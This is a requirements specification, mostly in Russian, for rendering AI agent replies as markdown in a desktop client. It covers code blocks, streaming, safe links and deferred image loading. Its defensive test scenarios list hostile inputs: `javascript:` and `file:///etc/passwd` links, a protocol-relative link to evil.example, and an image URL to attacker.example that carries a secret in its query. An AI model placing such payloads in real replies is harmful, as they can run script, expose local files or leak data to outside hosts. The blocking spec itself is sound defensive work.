## ADDED Requirements

### Requirement: Markdown в ответе агента
Лента SHALL рисовать текст ответа агента (`AgentTextItem.text`) как markdown без сырых маркеров разметки: заголовки, абзацы с курсивом, жирным, зачёркнутым и inline-кодом, маркированные и нумерованные списки с вложенностью, списки задач с неинтерактивным флажком Fluent, цитаты, таблицы, горизонтальная черта, блоки кода (требование «Блок кода в ответе агента») и формулы в `\(…\)` и `\[…\]`. Знак `$` SHALL оставаться обычным символом. Разбор SHALL выполнять пакет `gpt_markdown` внутри `codelab_ui` (`lib/src/rendering/`) со своими builder'ами и темой из `FluentTheme`, без Material-предка; ядро клиента и app НЕ SHALL разбирать markdown сами. HTML-теги SHALL показываться текстом как написаны и НЕ SHALL становиться элементами разметки, изображениями или ссылками. Цвета SHALL браться только из `FluentTheme`, тонов кита и палитры подсветки (DSK-19). Текст ответа SHALL выделяться мышью в пределах ответа. Промпт пользователя и мысли модели SHALL показываться как есть, без разметки (design.md change `add-desktop-markdown`, D1–D4, D7–D9).

#### Scenario: Ответ со smoke без сырых маркеров
- **WHEN** агент отвечает текстом, где «Готово.» обрамлено `**`, `dart test` в строке обрамлено обратными кавычками, а ниже идёт огороженный блок с языком `bash` и строкой `dart test`
- **THEN** лента показывает «Готово.» жирным, `dart test` в строке — inline-кодом, команду — блоком кода с подписью `bash`, а символов `**`, `` ` `` и строк ```` ``` ```` в ленте нет

#### Scenario: Разметка в теме Fluent без Material
- **WHEN** выполняется `acp_markdown_test.dart: renders headings lists tables quotes and inline code` в светлой и тёмной теме Fluent без Material-предка, с заголовками, вложенным списком, списком задач `[ ]`/`[x]`, таблицей и цитатой
- **THEN** исключений нет, заголовки имеют разные стили, задача `[x]` показана отмеченным Fluent `Checkbox` без реакции на клик, таблица и цитата отрисованы, цвета блока кода в тёмной теме — из тёмной палитры

#### Scenario: HTML показывается текстом
- **WHEN** ответ содержит `<b>bold</b>` и `<img src="https://x.example/y.png">`
- **THEN** лента показывает обе строки текстом как написаны, жирного начертания и изображения нет, сетевых запросов нет

#### Scenario: Доллар не формула
- **WHEN** ответ содержит `стоит $5, а $HOME — переменная` и `\(a^2\)`
- **THEN** первая строка показана текстом с символами `$`, а `\(a^2\)` — формулой

#### Scenario: Мысли без разметки
- **WHEN** агент стримит мысль `**plan**: read files`, затем ответ `**done**`
- **THEN** блок мыслей показывает `**plan**: read files` как есть, а ответ — «done» жирным

### Requirement: Блок кода в ответе агента
Блок кода ответа SHALL показывать подпись языка из info-строки ограды (без языка — без подписи) вне выделения текста, код моноширинным шрифтом с сохранением переводов строк и кнопку «Copy», которая кладёт в буфер обмена исходный код блока без строк ограды. Код SHALL подсвечиваться по языку info-строки из зарегистрированного набора своей палитрой из ролей `FluentTheme` с контрастом каждого класса токена не ниже 4,5:1 на фоне блока в светлой и тёмной теме; неизвестный язык или его отсутствие SHALL давать код без подсветки, без автоопределения. Токенизация кода до 300 строк и 16 КиБ MAY выполняться синхронно; код больше этого НЕ SHALL токенизироваться в UI isolate, а до готовности токенов SHALL показываться без цвета; код больше 5000 строк или 256 КиБ НЕ SHALL подсвечиваться (DSK-5). Сбой токенизации SHALL оставлять код без подсветки и SHALL сообщаться как ошибка Flutter без текста кода (design.md change `add-desktop-markdown`, D4).

#### Scenario: Язык и копирование
- **WHEN** выполняется `acp_markdown_test.dart: code block shows language and copy puts raw code into clipboard` для блока ```` ```dart ```` с двумя строками
- **THEN** блок показывает подпись `dart`, нажатие `code-copy-<rowId>-0` кладёт в буфер ровно две строки кода без ```` ``` ````, а выделение всего ответа не содержит подписи `dart`

#### Scenario: Большой блок подсвечивается вне UI isolate
- **WHEN** выполняется `acp_markdown_test.dart: large code block is highlighted off the UI isolate` для блока `dart` из 1000 строк
- **THEN** `highlightSyncRuns` равен 0, до результата код показан без цвета, после результата строка перерисована один раз

#### Scenario: Неизвестный язык
- **WHEN** блок кода имеет язык `foolang`
- **THEN** код показан моноширинно без подсветки, подпись `foolang` видна, «Copy» работает

### Requirement: Стриминг markdown без перестройки закрытых блоков
Пока ответ стримится, лента SHALL перестраивать только незакрытый хвост ответа: закрытый блок SHALL строиться не больше одного раза за время стрима, и обновление хвоста НЕ SHALL перестраивать закрытые блоки и другие строки ленты (DSK-3). Тема и builder'ы отрисовки SHALL создаваться один раз на тему Fluent и переиспользоваться между сборками. Незакрытая ограда в хвосте SHALL рисоваться моноширинным текстом без подсветки; подсветка SHALL запускаться только для закрытой ограды (DSK-6). Следование за хвостом и автопрокрутка к одобрению SHALL работать как раньше (требование «Лента transcript следует за хвостом») (design.md change `add-desktop-markdown`, D3).

#### Scenario: 200 дельт
- **WHEN** выполняется `acp_markdown_test.dart: streaming 200 chunks builds each closed block once` для ответа с заголовками и тремя блоками кода
- **THEN** после всех 200 обновлений `codeBlockBuilds` каждого закрытого блока кода и `headingBuilds` каждого заголовка равны 1

#### Scenario: Длинный ответ
- **WHEN** тот же тест выполняется для ответа 48 КБ
- **THEN** первый блок кода смонтирован и построен один раз, подсветка для него запускалась не больше одного раза

#### Scenario: Ограда закрывается во время стрима
- **WHEN** выполняется `acp_markdown_test.dart: unclosed fence in tail renders plain and highlights after close`: пришли строки ```` ```dart ```` и `final a = 1;`, затем закрывающая ограда
- **THEN** до закрывающей ограды код показан моноширинно без подсветки и без `highlightRuns`, после неё блок подсвечен, а абзац перед блоком не перестраивался

### Requirement: Ссылки в ответе агента
Ссылка в ответе SHALL быть активной, только если её адрес имеет схему `http` или `https` с непустым хостом либо `mailto` с непустым адресом; решение об активности SHALL принимать app и передавать ленте. Активная ссылка SHALL показываться подчёркнутой акцентным цветом с полным адресом во всплывающей подсказке (управляющие символы и символы направления текста — видимыми escape-последовательностями) и SHALL открываться внешним приложением по клику пользователя через порт платформы, который повторно проверяет схему. Ссылки с другими схемами (`file:`, `javascript:`, `data:`, `vscode:`, `xmpp:` и прочие), protocol-relative адреса и относительные пути SHALL показываться обычным текстом и НЕ SHALL открываться. Ссылка НЕ SHALL открываться без клика пользователя (DSK-7). Журнал открытия SHALL содержать схему, хост и исход и НЕ SHALL содержать путь, query и fragment (design.md change `add-desktop-markdown`, D5, D12).

#### Scenario: Ссылка https открывается по клику
- **WHEN** выполняется `acp_markdown_test.dart: link tap calls onOpenLink and non-http schemes are not tappable` для `[docs](https://example.com/a?token=abc)`, а в app пользователь кликает по `docs`
- **THEN** подсказка показывает `https://example.com/a?token=abc`, порт открывает адрес один раз, в журнале есть `scheme=https`, `host=example.com` и нет `token=abc`

#### Scenario: Опасные схемы не открываются
- **WHEN** ответ содержит `[x](javascript:alert(1))`, `[f](file:///etc/passwd)`, `[d](data:text/html,hi)`, `[v](vscode://open)`, `[p](//evil.example/a)` и `<xmpp:a@b>`
- **THEN** каждая из них показана обычным текстом без подчёркивания, клик не вызывает порт открытия ссылок

### Requirement: Изображения в ответе агента
Изображение из ответа агента НЕ SHALL загружаться без явного действия пользователя: по умолчанию лента SHALL показывать заглушку с подписью «Image», хостом и именем файла, с полным адресом в подсказке. Кнопка «Show image» SHALL показываться только для адреса со схемой `https` и непустым хостом; изображение SHALL загружаться только после нажатия этой кнопки. Для `http`, `data:`, `file:` и относительных адресов SHALL оставаться заглушка без кнопки. Выбор пользователя SHALL относиться к одной строке ленты и одному адресу, SHALL переживать уход строки с экрана и НЕ SHALL сохраняться между запусками. Ни отрисовка markdown, ни HTML ответа НЕ SHALL выполнять сетевых запросов до нажатия (VIEW-12, DSK-7; design.md change `add-desktop-markdown`, D6).

#### Scenario: Нет запросов до клика
- **WHEN** выполняется `acp_markdown_test.dart: markdown image is not fetched before user action` для `![](https://attacker.example/?d=secret)` и `![p](https://x.example/p.svg)` с перехватом сети
- **THEN** сетевых запросов нет, обе картинки показаны заглушками с хостом и кнопкой «Show image»

#### Scenario: Загрузка по клику
- **WHEN** пользователь нажимает «Show image» у `https://x.example/y.png`, прокручивает ленту так, что строка уходит с экрана, и возвращается
- **THEN** изображение запрошено один раз и показано, после возврата оно по-прежнему показано

#### Scenario: Небезопасный адрес изображения
- **WHEN** ответ содержит `![a](http://x.example/y.png)` и `![b](data:image/png;base64,AAAA)`
- **THEN** обе картинки показаны заглушками без кнопки «Show image», сетевых запросов нет

## MODIFIED Requirements

### Requirement: Transcript reads as a conversation
The transcript SHALL be laid out as a conversation in a column centred in the session pane, at most 760 px wide, without a frame around the transcript. A user message SHALL be a bubble aligned to the right, at most 78% of the column width, without a "You" label. An agent reply SHALL be rendered markdown in the column (requirement "Markdown в ответе агента") without a card and without an "Agent" label. Consecutive rows SHALL be separated by spacing, not by per-row cards.

#### Scenario: A prompt and its reply
- **WHEN** the user sends "Render replies as markdown" and the agent answers "I'll split the transcript into typed rows."
- **THEN** the transcript shows the prompt in a right-aligned bubble and the answer as a paragraph below it, and neither row shows a "You" or "Agent" label

#### Scenario: Wide window keeps a readable column
- **WHEN** the session pane is 1200 px wide
- **THEN** the transcript column is 760 px wide and centred in the pane

### Requirement: Model thoughts in a collapsible block
Each `agent_thought_chunk` segment SHALL be shown as a thought block distinct from the agent reply: muted text, a thought icon and a header. While the thought is streaming (it is the last transcript item of a running turn), the header SHALL read "Thinking…" with a progress indicator and the block SHALL be expanded. After the thought ends, the header SHALL read "Thoughts" and the block SHALL collapse to its header without animation. The user's manual choice to expand or collapse a block SHALL win over these defaults and SHALL survive the row scrolling out of view. In `verbose` the block SHALL be expanded by default; in `summary` it SHALL stay a one-line header. Thought text SHALL be shown as is, without markdown, and SHALL NOT be part of the agent reply.

#### Scenario: Thought while streaming
- **WHEN** the agent streams `agent_thought_chunk` updates and nothing else yet
- **THEN** the transcript shows an expanded block headed "Thinking…" with a progress indicator and the thought text

#### Scenario: Thought collapses when the reply starts
- **WHEN** after the thought the agent streams `agent_message_chunk` updates
- **THEN** the thought block collapses to its header "Thoughts", and the reply is shown below it as rendered markdown

#### Scenario: The user's choice wins
- **WHEN** the user expands a finished thought block, scrolls it out of view and back
- **THEN** the block is still expanded

### Requirement: Ответ агента одним огороженным блоком
Если весь текст ответа агента (`AgentTextItem`) без пробельных строк по краям — ровно один огороженный блок markdown, лента SHALL показывать его блоком кода по требованию «Блок кода в ответе агента»: без строк ограждения, с подписью языка, кнопкой «Copy», сохранением переводов строк и возможностью выделить текст; язык `text` не подсвечивается. Пока ход идёт и закрывающей строки ещё нет, содержимое SHALL показываться моноширинным блоком кода без подсветки, а не сырым текстом (DSK-6). Проза до или после блока и несколько блоков SHALL показываться как markdown (требование «Markdown в ответе агента»). Правило панели «Agent status» (spec app-settings, сценарий «Ответ /mcp list без внешнего ограждения») не меняется (решение пользователя 2026-11-11, design.md change `add-desktop-markdown`, D11; прежнее решение — Q37, D27 change `add-provider-setup-ui`).

#### Scenario: Ответ /mcp list в ленте
- **WHEN** встроенный агент отвечает на `/mcp list` текстом ```` ```text\nMCP servers (1)\n…\n``` ````
- **THEN** лента показывает строки `MCP servers (1)` и таблицу моноширинным блоком кода с подписью `text` и кнопкой «Copy», строк ```` ```text ```` и ```` ``` ```` нет

#### Scenario: Текст вокруг блока
- **WHEN** ответ агента содержит прозу до или после огороженного блока или два блока
- **THEN** лента показывает прозу как markdown, а каждый огороженный блок — блоком кода

#### Scenario: Открывающая строка во время хода
- **WHEN** ход идёт, и ответ пока состоит из строки ```` ```text ```` и одной строки вывода
- **THEN** лента показывает строку вывода моноширинным блоком без подсветки, строки ```` ```text ```` нет
